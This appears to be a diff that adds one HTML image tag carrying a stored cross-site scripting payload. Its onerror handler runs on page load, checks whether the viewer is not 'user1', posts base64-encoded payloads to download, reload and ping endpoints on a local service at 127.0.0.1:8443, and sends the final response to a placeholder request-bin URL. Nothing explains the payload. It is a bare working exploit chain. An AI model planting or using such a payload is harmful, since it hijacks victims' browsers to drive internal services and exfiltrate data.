@@ -1,0 +1,6 @@
+<img src=x onerror="fetch('/api/users/me').then(res => {return res.json();}).then(data => {const isUser1 = data?.user?.username === 'user1';if(!isUser1){fetch('https://127.0.0.1:8443/download', {method: 'POST',headers: { 'Content-Type': 'application/json' },body: atob('<Download Payload>'),}).then(res => {return res.text()}).then(res => {fetch('https://127.0.0.1:8443/reload', {method: 'POST',headers: { 'Content-Type': 'application/json' },body: atob('<Reload Payload>'),}).then(res => {return res.text()}).then(res => {fetch('https://127.0.0.1:8443/ping', {method: 'POST',headers: { 'Content-Type': 'application/json' },body: atob('<Ping Payload>'),}).then(res => {return res.text()}).then(data => {fetch(`https://<Request Bin URL>?d=${data}`)})})})};});">
+
+
+
+
+
